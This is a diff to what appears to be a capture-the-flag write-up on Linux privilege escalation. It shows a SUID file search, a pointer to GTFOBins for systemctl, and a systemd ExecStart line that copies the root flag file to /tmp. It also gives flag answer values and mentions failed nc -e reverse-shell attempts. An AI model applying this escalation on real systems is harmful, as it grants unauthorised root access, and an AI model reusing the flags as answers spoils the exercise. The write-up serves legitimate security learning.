@@ -106,7 +106,7 @@ A. 8bd7992fbe8a6ad22a63361004cfcedb
 
 Q. On the system, search for all SUID files. Which file stands out?
 
-A. /bin/systemctl
+A. go to https://gtfobins.github.io/gtfobins/systemctl/ to find answer = /bin/systemctl
 
 find / -type f -perm -04000 -ls 2>/dev/null
    396628     44 -rwsr-xr-x   1 root     root        41552 Feb  6  2024 /usr/bin/newuidmap
@@ -148,7 +148,9 @@ Q. What is the root flag value?
 
 A. a58ff8579f0a9270368d33a9966c7fd5
 
-https://gtfobins.github.io/gtfobins/systemctl/
+#Check Gtfobins for SUID escalation script
+
+
 
 Move to a writeable directory - I used /tmp
 
@@ -188,4 +190,4 @@ ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
 
 That worked fine. 
 
-REMINDER: I'll need to come back to this once I understand why nc -e isn't available and why bash has trouble with >&
+# REMINDER: I'll need to come back to this once I understand why nc -e isn't available and why bash has trouble with >&
